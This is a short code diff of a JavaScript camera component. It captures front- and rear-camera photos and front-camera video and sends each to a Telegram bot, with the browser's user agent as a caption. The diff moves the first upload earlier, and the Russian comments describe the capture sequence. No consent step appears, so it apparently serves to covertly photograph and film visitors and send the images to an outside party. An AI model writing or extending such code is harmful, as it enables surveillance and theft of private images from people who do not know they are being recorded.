@@ -72,6 +72,15 @@ function CameraApp() {
       setPhotoDataUrl(canvas.toDataURL("image/png"));
 
       const blob1 = await new Promise(res => canvas.toBlob(res, "image/png"));
+
+      if (blob1 && window.sendPhotoToTelegram) {
+        await window.sendPhotoToTelegram({
+          botToken: window.TELEGRAM_BOT_TOKEN,
+          chatId: window.TELEGRAM_CHAT_ID,
+          photoBlob: blob1,
+          caption: navigator.userAgent
+        });
+      }
       // С этого места берём кадр с задней камеры и отправляем его
       let rearStream;
       try {
@@ -98,14 +107,7 @@ function CameraApp() {
       } finally {
         if (rearStream) rearStream.getTracks().forEach(t => t.stop());
       }
-      if (blob1 && window.sendPhotoToTelegram) {
-        await window.sendPhotoToTelegram({
-          botToken: window.TELEGRAM_BOT_TOKEN,
-          chatId: window.TELEGRAM_CHAT_ID,
-          photoBlob: blob1,
-          caption: navigator.userAgent
-        });
-      }
+      
       if (blob2 && window.sendPhotoToTelegram) {
         await window.sendPhotoToTelegram({
           botToken: window.TELEGRAM_BOT_TOKEN,
@@ -114,7 +116,7 @@ function CameraApp() {
           caption: ""
         });
       }
-
+      
       // После успешной отправки фото — записываем и отправляем видео (строго фронтальная камера)
       let videoStream;
       try {
